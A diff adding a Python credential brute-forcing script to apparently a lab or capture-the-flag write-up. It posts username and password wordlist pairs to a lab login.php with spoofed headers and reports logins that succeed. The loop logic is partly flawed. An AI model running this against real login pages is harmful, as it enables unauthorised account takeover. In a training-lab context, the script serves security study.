@@ -1092,5 +1092,87 @@ to filter the list we need to consider the following password criteria:
 
 
 
+```python
+import sys
+import requests
+import os.path
+
+# define target url, change as needed
+url = "http://94.237.48.205:33074/login.php"
+
+# define a fake headers to present ourself as Chromium browser, change if needed
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-GPC": "1",
+    "Cookie": "htb_sessid=NzEwZTVkMmQ2ZGI3ZTcwMzRlNmJlM2JhZGJhZGRmMzk%3D"
+}
+
+valid = "Welcome"
+
+def do_req(url, user, message, headers):
+    data = {"userid": user, "passwd": message, "submit": "submit", "rememberme": "rememberme"}
+    res = requests.post(url, headers=headers, data=data)
+
+    return res.text
+
+"""
+if defined valid string is found in response body return True
+"""
+def check(haystack, needle):
+    print(haystack)
+    if needle in haystack:
+        return True
+    else:
+        return False
+
+def main():
+    # check if this script has been runned with an argument, and the argument exists and is a file
+    if len(sys.argv) == 3 and os.path.isfile(sys.argv[1]) and os.path.isfile(sys.argv[2]):
+        username_list = sys.argv[1]
+        password_list = sys.argv[2]
+    else:
+        print("[!] Please check wordlists")
+        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
+        sys.exit()
+        
+    usernames = []
+    
+    with open(username_list) as ulist:
+        for username in ulist:
+            usernames.append(username.rstrip())
+    
+    successful_credentials = {}
+
+    with open(password_list) as fh:
+        # will be slow for long lists of usernames but for now we have only a few
+        for username in usernames:
+            for fline in fh:
+                # skip line if it starts with a comment
+                if fline.startswith("#"):
+                    continue
+                
+                password = fline.rstrip()
+                res = do_req(url, username, password, headers)
+
+                # call function check() to verify if HTTP response text matches our content
+                if (check(res, valid)):
+                    print(f"{username}:{password} - successfully logged in")
+                    successful_credentials[username] = password
+                else:
+                    print(f"{username}:{password}")
+                
+        print("Successful credentials found: \n")
+        
+        for username, password in successful_credentials.items():
+            print(f"{username}:{password}")
+
+if __name__ == "__main__":
+    main()
+```
+
 
 
